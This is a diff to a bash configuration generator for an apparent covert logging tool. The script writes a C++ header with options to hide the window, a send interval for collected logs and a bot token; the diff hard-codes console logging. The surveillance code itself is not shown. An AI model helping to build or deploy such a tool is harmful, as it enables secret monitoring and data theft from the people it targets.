@@ -103,8 +103,6 @@ log_to_file=$(ask_yes_no "Save data to file?" "y")
 
 hide_window=$(ask_yes_no "Hide debug window?" "n")
 
-log_to_console=$(ask_yes_no "Print output to console?" "y")
-
 while true; do
     wait_time=$(ask_input "Enter the time interval in minutes after which the log will be sent (min 1)" "5")
     if [[ "$wait_time" =~ ^[0-9]+$ ]] && [ "$wait_time" -ge 1 ]; then
@@ -161,7 +159,7 @@ echo -e "${cyan}Generating configuration...${reset}"
     echo "#pragma once"
     echo "#include <string>"
     echo "const bool           logToFile     = $log_to_file;"
-    echo "const bool           logToConsole  = $log_to_console;"
+    echo "const bool           logToConsole  = true;"
     echo "const bool           hideWindow    = $hide_window;"
     echo "const int            waitTime      = $wait_time;"
     echo "const std::wstring   botToken      = L\"$bot_token\";"
